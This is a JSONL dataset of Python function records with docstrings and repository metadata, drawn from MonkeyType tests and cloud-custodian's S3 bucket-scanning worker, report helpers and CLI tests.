{"docstring": "\"\"\"We can't disambiguate between getters, setters, and deleters\"\"\"\n", "func_signal": "def test_get_settable_property(self):\n", "code": "func = Dummy.a_settable_property.fget\nwith pytest.raises(InvalidTypeError):\n    get_func_in_module(func.__module__, func.__qualname__)", "path": "MonkeyType/tests/test_util.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Ensure traces have a return_type of NoneType for functions that return a value of None\"\"\"\n", "func_signal": "def test_return_none(self, collector):\n", "code": "with trace_calls(collector, max_typed_dict_size=0):\n    implicit_return_none()\n    explicit_return_none()\nexpected = [\n    CallTrace(implicit_return_none, {}, NoneType),\n    CallTrace(explicit_return_none, {}, NoneType),\n]\nassert collector.traces == expected", "path": "MonkeyType/tests/test_tracing.py", "commit_date": "2020-03-29 00:00:00", "repo_name": "Instagram/MonkeyType", "stars": 4496, "license": "other", "language": "python", "size": 665}
{"docstring": "\"\"\"Bucket pagination\n\"\"\"\n", "func_signal": "def process_bucket_iterator(bid, prefix=\"\", delimiter=\"\", **continuation):\n", "code": "log.info(\"Iterating keys bucket %s prefix %s delimiter %s\",\n         bid, prefix, delimiter)\n\naccount, bucket = bid.split(':', 1)\nregion = connection.hget('bucket-regions', bid)\nversioned = bool(int(connection.hget('bucket-versions', bid)))\nsession = get_session(\n    json.loads(connection.hget('bucket-accounts', account)))\ns3 = session.client('s3', region_name=region, config=s3config)\n\n(contents_key, contents_method, _) = BUCKET_OBJ_DESC[versioned]\n\nparams = dict(Bucket=bucket)\nif prefix:\n    params['Prefix'] = prefix\nif delimiter:\n    params['Delimiter'] = delimiter\nif continuation:\n    params.update({k[4:]: v for k, v in continuation.items()})\npaginator = s3.get_paginator(contents_method).paginate(**params)\nwith bucket_ops(bid, 'page'):\n    ptime = time.time()\n    pcounter = 0\n    for page in paginator:\n        page = page_strip(page, versioned)\n        pcounter += 1\n        if page:\n            invoke(process_keyset, bid, page)\n\n        if pcounter % 10 == 0:\n            with connection.pipeline() as p:\n                nptime = time.time()\n                p.hincrby('bucket-pages', bid, 1)\n                p.hincrby('bucket-pages-time', bid, int(nptime - ptime))\n                ptime = nptime\n                p.execute()\n\n    if pcounter % 10:\n        with connection.pipeline() as p:\n            nptime = time.time()\n            p.hincrby('bucket-pages', bid, 1)\n            p.hincrby('bucket-pages-time', bid, int(nptime - ptime))\n            p.execute()", "path": "cloud-custodian/tools/c7n_salactus/c7n_salactus/worker.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\"Bulk invoke a function via queues\n\nUses internal implementation details of rq.\n\"\"\"\n# for comparison, simplest thing that works\n# for i in nargs:\n#    argv = list(args)\n#    argv.append(i)\n#    func.delay(*argv)\n\n# some variances between cpy and pypy, sniff detect\n", "func_signal": "def bulk_invoke(func, args, nargs):\n", "code": "for closure in func.delay.func_closure:\n    if getattr(closure.cell_contents, 'queue', None):\n        ctx = closure.cell_contents\n        break\nq = Queue(ctx.queue, connection=connection)\nargv = list(args)\nargv.append(None)\njob = Job.create(\n    func, args=argv, connection=connection,\n    description=\"bucket-%s\" % func.func_name,\n    origin=q.name, status=JobStatus.QUEUED, timeout=ctx.timeout,\n    result_ttl=0, ttl=ctx.ttl)\n\nfor n in chunks(nargs, 100):\n    job.created_at = datetime.utcnow()\n    with connection.pipeline() as pipe:\n        for s in n:\n            argv[-1] = s\n            job._id = unicode(uuid4())  # noqa: F821\n            job.args = argv\n            q.enqueue_job(job, pipeline=pipe)\n        pipe.execute()", "path": "cloud-custodian/tools/c7n_salactus/c7n_salactus/worker.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\"Scan all buckets in an account and schedule processing\"\"\"\n", "func_signal": "def process_account(account_info):\n", "code": "log = logging.getLogger('salactus.bucket-iterator')\nlog.info(\"processing account %s\", account_info)\nsession = get_session(account_info)\nclient = session.client('s3', config=s3config)\nbuckets = client.list_buckets()['Buckets']\n\nconnection.hset(\n    'bucket-accounts', account_info['name'], json.dumps(account_info))\n\nfor b in buckets:\n    connection.hset(\n        'bucket-ages', bucket_id(account_info, b['Name']),\n        b['CreationDate'].isoformat())\n\naccount_buckets = account_info.pop('buckets', None)\nbuckets = [n['Name'] for n in buckets\n           if not account_buckets or\n           n['Name'] in account_buckets]\naccount_not_buckets = account_info.pop('not-buckets', None)\nbuckets = [n for n in buckets\n           if not account_not_buckets or\n           n not in account_not_buckets]\nlog.info(\"processing %d buckets in account %s\",\n         len(buckets), account_info['name'])\nfor bucket_set in chunks(buckets, 50):\n    invoke(process_bucket_set, account_info, bucket_set)", "path": "cloud-custodian/tools/c7n_salactus/c7n_salactus/worker.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\"Context manager for dealing with s3 errors in one place\n\nbid: bucket_id in form of account_name:bucket_name\n\"\"\"\n", "func_signal": "def bucket_ops(bid, api=\"\"):\n", "code": "try:\n    yield 42\nexcept ClientError as e:\n    code = e.response['Error']['Code']\n    log.info(\n        \"bucket error bucket:%s error:%s\",\n        bid,\n        e.response['Error']['Code'])\n    if code == \"NoSuchBucket\":\n        pass\n    elif code == 'AccessDenied':\n        connection.sadd('buckets-denied', bid)\n    else:\n        connection.hset(\n            'buckets-unknown-errors',\n            bid,\n            \"%s:%s\" % (api, e.response['Error']['Code']))\nexcept Exception as e:\n    connection.hset(\n        'buckets-unknown-errors',\n        bid,\n        \"%s:%s\" % (api, str(e)))\n    # Let the error queue catch it\n    raise", "path": "cloud-custodian/tools/c7n_salactus/c7n_salactus/worker.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "# This test is to examine the warning output supplied when -p is used and\n# the resulting policy set is empty.  It is not specific to the `report`\n# subcommand - it is also used by `run` and a few other subcommands.\n\n", "func_signal": "def test_warning_on_empty_policy_filter(self):\n", "code": "policy_name = \"test-policy\"\nvalid_policies = {\n    \"policies\": [\n        {\n            \"name\": policy_name,\n            \"resource\": \"s3\",\n            \"filters\": [{\"tag:custodian_tagging\": \"not-null\"}],\n        }\n    ]\n}\nyaml_file = self.write_policy_file(valid_policies)\ntemp_dir = self.get_temp_dir()\n\nbad_policy_name = policy_name + \"-nonexistent\"\nlog_output = self.capture_logging(\"custodian.commands\")\nself.run_and_expect_failure(\n    [\"custodian\", \"report\", \"-s\", temp_dir, \"-p\", bad_policy_name, yaml_file], 1\n)\nself.assertIn(policy_name, log_output.getvalue())\n\nbad_resource_name = \"foo\"\nself.run_and_expect_failure(\n    [\"custodian\", \"report\", \"-s\", temp_dir, \"-t\", bad_resource_name, yaml_file],\n    1,\n)", "path": "cloud-custodian/tests/test_cli.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\" Use set of keys as selector for character superset\n\nNote this isn't optimal, its probabilistic on the keyset char population.\n\"\"\"\n# use the keys found to sample possible chars\n", "func_signal": "def get_keys_charset(keys, bid):\n", "code": "chars = set()\nfor k in keys:\n    chars.update(k[:4])\nremainder = chars\n\n# Normalize charsets for matching\nnormalized = {}\nfor n, sset in [\n    (\"p\", set(string.punctuation)),\n    (\"w\", set(string.whitespace))\n]:\n    m = chars.intersection(sset)\n    if m:\n        normalized[n] = m\n        remainder = remainder.difference(sset)\n\n# Detect character sets\ncharset = None\nfor candidate in CharSet.charsets():\n    if remainder.issubset(candidate):\n        charset = candidate\n        break\n\nif charset is None:\n    raise ValueError(\n        \"Bucket: %s Failed charset ngram detection %r\\n%s\" % (\n            bid, \"\".join(chars), \"\\n\".join(sorted(keys))))\n\nfor n, sset in normalized.items():\n    charset = charset.symmetric_difference(sset)\n\nreturn charset", "path": "cloud-custodian/tools/c7n_salactus/c7n_salactus/worker.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\"Get a boto3 sesssion potentially cross account sts assumed\n\nassumed sessions are automatically refreshed.\n\"\"\"\n", "func_signal": "def get_session(account_info):\n", "code": "s = getattr(CONN_CACHE, '%s-session' % account_info['name'], None)\nif s is not None:\n    return s\nif account_info.get('role'):\n    s = assumed_session(account_info['role'], SESSION_NAME)\nelse:\n    s = boto3.Session()\nsetattr(CONN_CACHE, '%s-session' % account_info['name'], s)\nreturn s", "path": "cloud-custodian/tools/c7n_salactus/c7n_salactus/worker.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "# refs should only ever exist in a dictionary by itself\n", "func_signal": "def test_schema_expand(self):\n", "code": "test_schema = {\n    '$ref': '#/definitions/filters_common/value_from'\n}\nresult = ElementSchema.schema(generate()['definitions'], test_schema)\nself.assertEqual(result, ValuesFrom.schema)", "path": "cloud-custodian/tests/test_cli.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\" Run cli.main() with supplied argv and expect exit_code. \"\"\"\n", "func_signal": "def run_and_expect_failure(self, argv, exit_code):\n", "code": "self.patch_account_id()\nself.patch(sys, \"argv\", argv)\nout, err = self.capture_output()\n# clear_resources()\nwith self.assertRaises(SystemExit) as cm:\n    cli.main()\nself.assertEqual(cm.exception.code, exit_code)\nreturn out.getvalue(), err.getvalue()", "path": "cloud-custodian/tests/test_cli.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "# Doesn't do anything, but should exit 0\n", "func_signal": "def test_empty_policy_file(self):\n", "code": "temp_dir = self.get_temp_dir()\nyaml_file = self.write_policy_file({})\nself.run_and_expect_failure(\n    [\"custodian\", \"run\", \"-s\", temp_dir, yaml_file], 1)", "path": "cloud-custodian/tests/test_cli.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\"Load last inventory dump and feed as key source.\n\"\"\"\n", "func_signal": "def process_bucket_inventory(bid, inventory_bucket, inventory_prefix):\n", "code": "log.info(\"Loading bucket %s keys from inventory s3://%s/%s\",\n         bid, inventory_bucket, inventory_prefix)\naccount, bucket = bid.split(':', 1)\nregion = connection.hget('bucket-regions', bid)\nversioned = bool(int(connection.hget('bucket-versions', bid)))\nsession = boto3.Session()\ns3 = session.client('s3', region_name=region, config=s3config)\n\n# find any key visitors with inventory filtering\naccount_info = json.loads(connection.hget('bucket-accounts', account))\nifilters = [v.inventory_filter for v\n            in get_key_visitors(account_info) if v.inventory_filter]\n\nwith bucket_ops(bid, 'inventory'):\n    page_iterator = load_bucket_inventory(\n        s3, inventory_bucket, inventory_prefix, versioned, ifilters)\n    if page_iterator is None:\n        log.info(\"bucket:%s could not find inventory\" % bid)\n        # case: inventory configured but not delivered yet\n        # action: dispatch to bucket partition (assumes 100k+ for inventory)\n        # - todo consider max inventory age/staleness for usage\n        return invoke(process_bucket_partitions, bid)\n    connection.hset('buckets-inventory', bid, 1)\n    for page in page_iterator:\n        invoke(process_keyset, bid, page)", "path": "cloud-custodian/tools/c7n_salactus/c7n_salactus/worker.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\"Only the first record for each id\"\"\"\n", "func_signal": "def uniq_by_id(self, records):\n", "code": "uniq = []\nkeys = set()\nfor rec in records:\n    rec_id = rec[self._id_field]\n    if rec_id not in keys:\n        uniq.append(rec)\n        keys.add(rec_id)\nreturn uniq", "path": "cloud-custodian/c7n/reports/csvout.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\" Run cli.main() with supplied argv and expect normal execution. \"\"\"\n", "func_signal": "def run_and_expect_success(self, argv):\n", "code": "self.patch_account_id()\nself.patch(sys, \"argv\", argv)\nout, err = self.capture_output()\ntry:\n    cli.main()\nexcept SystemExit as e:\n    self.fail(\n        \"Expected sys.exit would not be called. Exit code was ({})\".format(\n            e.code\n        )\n    )\nreturn out.getvalue(), err.getvalue()", "path": "cloud-custodian/tests/test_cli.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\"Retrieve all s3 records for the given policy output url\n\nFrom the given start date.\n\"\"\"\n\n", "func_signal": "def record_set(session_factory, bucket, key_prefix, start_date, specify_hour=False):\n", "code": "s3 = local_session(session_factory).client('s3')\n\nrecords = []\nkey_count = 0\n\ndate = start_date.strftime('%Y/%m/%d')\nif specify_hour:\n    date += \"/{}\".format(start_date.hour)\nelse:\n    date += \"/00\"\n\nmarker = \"{}/{}/resources.json.gz\".format(key_prefix.strip(\"/\"), date)\n\np = s3.get_paginator('list_objects_v2').paginate(\n    Bucket=bucket,\n    Prefix=key_prefix.strip('/') + '/',\n    StartAfter=marker,\n)\n\nwith ThreadPoolExecutor(max_workers=20) as w:\n    for key_set in p:\n        if 'Contents' not in key_set:\n            continue\n        keys = [k for k in key_set['Contents']\n                if k['Key'].endswith('resources.json.gz')]\n        key_count += len(keys)\n        futures = map(lambda k: w.submit(\n            get_records, bucket, k, session_factory), keys)\n\n        for f in as_completed(futures):\n            records.extend(f.result())\n\nlog.info(\"Fetched %d records across %d files\" % (\n    len(records), key_count))\nreturn records", "path": "cloud-custodian/c7n/reports/csvout.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\"Select and dispatch an object source for a bucket.\n\nChoices are bucket partition, inventory, or direct pagination.\n\"\"\"\n\n", "func_signal": "def dispatch_object_source(client, account_info, bid, bucket_info):\n", "code": "if (account_info.get('inventory') and\n    bucket_info['keycount'] >\n        account_info['inventory'].get('bucket-size-threshold',\n                                      DEFAULT_INVENTORY_BUCKET_SIZE_THRESHOLD)):\n    inventory_info = get_bucket_inventory(\n        client,\n        bucket_info['name'],\n        account_info['inventory'].get('id-selector', '*'))\n    if inventory_info is not None:\n        return invoke(\n            process_bucket_inventory, bid,\n            inventory_info['bucket'], inventory_info['prefix'])\n\nif bucket_info['keycount'] > PARTITION_BUCKET_SIZE_THRESHOLD:\n    invoke(process_bucket_partitions, bid)\nelse:\n    invoke(process_bucket_iterator, bid)", "path": "cloud-custodian/tools/c7n_salactus/c7n_salactus/worker.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "# Patch get_subscription_id during provider initialization\n", "func_signal": "def test_initialize_default_account_id(self):\n", "code": "with patch('c7n_azure.session.Session.get_subscription_id',\n           return_value=DEFAULT_SUBSCRIPTION_ID):\n    options = Config.empty()\n    azure = Azure()\n    azure.initialize(options)\n    self.assertEqual(options['account_id'], DEFAULT_SUBSCRIPTION_ID)\n    session = azure.get_session_factory(options)()\n\nself.assertEqual(DEFAULT_SUBSCRIPTION_ID, session.get_subscription_id())", "path": "cloud-custodian/tools/c7n_azure/tests_azure/test_provider.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\"Try to detect the best partitioning strategy for a large bucket\n\nConsider nested buckets with common prefixes, and flat buckets.\n\"\"\"\n", "func_signal": "def detect_partition_strategy(bid, delimiters=('/', '-'), prefix=''):\n", "code": "account, bucket = bid.split(\":\", 1)\nregion = connection.hget('bucket-regions', bid)\nversioned = bool(int(connection.hget('bucket-versions', bid)))\nsize = int(float(connection.hget('bucket-sizes', bid)))\nsession = get_session(\n    json.loads(connection.hget('bucket-accounts', account)))\ns3 = session.client('s3', region_name=region, config=s3config)\n\n(contents_key,\n contents_method,\n continue_tokens) = BUCKET_OBJ_DESC[versioned]\n\nwith bucket_ops(bid, 'detect'):\n    keys = set()\n    for delimiter in delimiters:\n        method = getattr(s3, contents_method, None)\n        results = method(\n            Bucket=bucket, Prefix=prefix, Delimiter=delimiter)\n        prefixes = [p['Prefix'] for p in results.get('CommonPrefixes', [])]\n        contents = results.get(contents_key, [])\n        keys.update([k['Key'] for k in contents])\n        # If we have common prefixes within limit thresholds go wide\n        if (len(prefixes) > 0 and\n            len(prefixes) < 1000 and\n                len(contents) < 1000):\n            log.info(\n                \"%s detected prefix delimiter:%s contents:%d prefixes:%d\",\n                bid, delimiter, len(contents), len(prefixes))\n            limit = prefix and 2 or 4\n            return process_bucket_partitions(\n                bid, partition=delimiter,\n                strategy='p', prefix_set=prefixes, limit=limit)\n\n# Detect character sets\ncharset = get_keys_charset(keys, bid)\nlog.info(\"Detected charset %s for %s\", charset, bid)\n\n# Determine the depth we need to keep total api calls below threshold\nscan_count = size / 1000.0\nfor limit in range(1, 4):\n    if math.pow(len(charset), limit) * 1000 > scan_count:\n        break\n\n# Dispatch\nprefixes = ('',)\nprefixes = NGramPartition(\n    charset, limit=limit).initialize_prefixes(prefixes)\n\n#\nrandom.shuffle(prefixes)\n\n# Pregen on ngram means we have many potentially useless prefixes\n# todo carry charset forward as param, and go incremental on prefix\n# ngram expansion\nconnection.hincrby('bucket-partition', bid, len(prefixes))\nreturn bulk_invoke(\n    process_bucket_iterator, [bid], prefixes)", "path": "cloud-custodian/tools/c7n_salactus/c7n_salactus/worker.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\"Process a collection of buckets.\n\nFor each bucket fetch location, versioning and size and\nthen kickoff processing strategy based on size.\n\"\"\"\n", "func_signal": "def process_bucket_set(account_info, buckets):\n", "code": "region_clients = {}\nlog = logging.getLogger('salactus.bucket-set')\nlog.info(\"processing account %s\", account_info)\nsession = get_session(account_info)\nclient = session.client('s3', config=s3config)\n\nfor b in buckets:\n    bid = bucket_id(account_info, b)\n    with bucket_ops(bid):\n        info = {'name': b}\n        error = None\n\n        try:\n            location = client.get_bucket_location(\n                Bucket=b).get('LocationConstraint')\n        except Exception as e:\n            error = e\n            location = None\n\n        if location is None:\n            region = \"us-east-1\"\n        elif location == 'EU':\n            region = \"eu-west-1\"\n        else:\n            region = location\n\n        if (account_info.get('regions', ()) and\n                region not in account_info.get('regions', ())):\n            continue\n\n        info['region'] = region\n        if region not in region_clients:\n            region_clients.setdefault(region, {})\n            region_clients[region]['s3'] = s3 = session.client(\n                's3', region_name=region, config=s3config)\n            region_clients[region]['cloudwatch'] = cw = session.client(\n                'cloudwatch', region_name=region, config=s3config)\n        else:\n            s3 = region_clients[region]['s3']\n            cw = region_clients[region]['cloudwatch']\n\n        try:\n            info['keycount'] = bucket_key_count(cw, info)\n        except Exception:\n            raise\n        else:\n            connection.hset('bucket-sizes', bid, info['keycount'])\n\n        if error:\n            raise error\n\n        connection.hset('bucket-regions', bid, region)\n\n        versioning = s3.get_bucket_versioning(Bucket=b)\n        info['versioned'] = (\n            versioning and versioning.get('Status', '')\n            in ('Enabled', 'Suspended') or False)\n        connection.hset('bucket-versions', bid, int(info['versioned']))\n\n        log.info(\"processing bucket %s\", info)\n        connection.hset('bucket-starts', bid, time.time())\n        dispatch_object_source(s3, account_info, bid, info)", "path": "cloud-custodian/tools/c7n_salactus/c7n_salactus/worker.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "\"\"\"Remove bits in content results to minimize memory utilization.\n\nTODO: evolve this to a key filter on metadata, like date\n\n\"\"\"\n# page strip filtering should be conditional\n", "func_signal": "def page_strip(page, versioned):\n", "code": "page.pop('ResponseMetadata', None)\ncontents_key = versioned and 'Versions' or 'Contents'\ncontents = page.get(contents_key, ())\n\n# aggressive size\nif versioned:\n    keys = []\n    for k in contents:\n        if k['IsLatest']:\n            keys.append((k['Key'], k['VersionId'], True))\n        else:\n            keys.append((k['Key'], k['VersionId']))\n    return keys\nelse:\n    return [k['Key'] for k in contents]\n\nif not contents:\n    return page\n\n# Depending on use case we may want these\nfor k in contents:\n    k.pop('Owner', None)\n    k.pop('LastModified', None)\n    k.pop('ETag', None)\n    k.pop('StorageClass', None)\n    k.pop('Size', None)\n\nreturn page", "path": "cloud-custodian/tools/c7n_salactus/c7n_salactus/worker.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
{"docstring": "# invalid resource\n", "func_signal": "def test_invalid_options(self):\n", "code": "        self.run_and_expect_failure([\"custodian\", \"schema\", \"fakeresource\"], 1)\n# invalid category\n        self.run_and_expect_failure([\"custodian\", \"schema\", \"ec2.arglbargle\"], 1)\n# invalid item\n        self.run_and_expect_failure(\n            [\"custodian\", \"schema\", \"ec2.filters.nonexistent\"], 1\n        )\n# invalid number of selectors\n        self.run_and_expect_failure([\"custodian\", \"schema\", \"ec2.filters.and.foo\"], 1)", "path": "cloud-custodian/tests/test_cli.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "cloud-custodian/cloud-custodian", "stars": 5161, "license": "apache-2.0", "language": "python", "size": 130622}
